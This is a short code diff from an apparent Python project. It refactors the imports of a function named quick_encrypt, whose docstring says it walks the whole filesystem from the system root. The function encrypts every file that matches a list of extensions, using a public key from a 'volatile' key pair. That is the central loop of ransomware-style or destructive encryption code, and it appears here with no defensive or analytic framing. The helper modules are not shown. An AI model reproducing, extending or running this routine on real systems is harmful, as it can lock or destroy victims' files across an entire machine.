@@ -25,11 +25,11 @@ def quick_encrypt():
     The search for files is recursive, and the starting point is by default the root
     of the system.
     """
-    import seal
-    import burn 
-    priv_key,pub_key=seal.volatile_key()
+    from seal import volatile_key
+    from burn import fast_encrypt
+    priv_key,pub_key=volatile_key()
     for rute, dirs, files in os.walk(source):
         for file in files:
             for extension in extensions:
                 if fnmatch.fnmatch(file, f'*.{extension}'):
-                    burn.fast_encrypt(os.path.join(rute,file),pub_key)
+                    fast_encrypt(os.path.join(rute,file),pub_key)
